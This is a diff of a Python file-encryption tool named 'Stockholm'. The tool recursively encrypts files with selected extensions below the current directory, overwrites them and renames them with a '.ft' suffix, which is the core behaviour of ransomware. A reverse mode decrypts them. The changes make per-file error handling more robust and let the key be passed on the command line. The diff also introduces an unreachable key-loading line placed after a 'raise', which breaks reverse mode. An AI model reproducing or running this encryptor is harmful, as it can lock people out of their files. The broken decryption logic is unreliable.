@@ -6,10 +6,6 @@ import sys
 import os
 
 
-def loadKey() :
-	return open("key", "rb").read()
-
-
 def genKey() :
 	key = Fernet.generate_key()
 	with open("key", "wb") as key_file:
@@ -20,13 +16,18 @@ def genKey() :
 def rev(args : str) :
 	curr_dir = os.getcwd()
 	files = []
-	k = Fernet(loadKey())
+	key = args.reverse
+	if args.reverse == "key":
+		if not os.path.exists("key") or not os.access("key", os.R_OK):
+			raise OSError("file 'key' is inaccesible.")
+			key = open("key", "rb").read()
+	k = Fernet(key)
 	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
 		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
 		files.extend(files_tmp)
 	to_decrypt = [file for file in files if os.path.splitext(file)[1] == ".ft"]
-	try:
-		for i in to_decrypt:
+	for i in to_decrypt:
+		try:
 			with open(i, "rb") as f:
 				text = k.decrypt(f.read())
 			with open(i, "wb") as f:
@@ -34,8 +35,8 @@ def rev(args : str) :
 			os.rename(i, i[:-3])
 			if not args.silent:
 				print(f"{i} has been decrypted.")
-	except Exception as e :
-		print(f"Error: decrypting file {i}: {e}")
+		except Exception as e :
+			print(f"Error: decrypting file {i}: {e}")
 
 
 def encrypt(args : str) :
@@ -48,8 +49,8 @@ def encrypt(args : str) :
 		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
 		files.extend(files_tmp)
 	to_encrypt = [file for file in files if os.path.splitext(file)[1].lower() in extensions]
-	try:
-		for i in to_encrypt:
+	for i in to_encrypt:
+		try:
 			with open(i, "rb") as f:
 				text = k.encrypt(f.read())
 			with open(i, "wb") as f:
@@ -57,8 +58,8 @@ def encrypt(args : str) :
 			os.rename(i, f"{i}.ft")
 			if not args.silent:
 				print(f"{i} has been encrypted.")
-	except Exception as e :
-		print(f"Error: encrypting file {i}: {e}")
+		except Exception as e :
+			print(f"Error: encrypting file {i}: {e}")
 
 
 def main() :
@@ -75,6 +76,7 @@ def main() :
 		args = parser.parse_args()
 		if args.version :
 			print("Stockholm: v0.01")
+			exit(0)
 		if not args.reverse :
 			encrypt(args)
 		else:
@@ -84,4 +86,7 @@ def main() :
 
 
 if __name__ == "__main__" :
-	main()
+	try:
+		main()
+	except KeyboardInterrupt:
+		print("Process interrupted. Exiting Gracefully...")
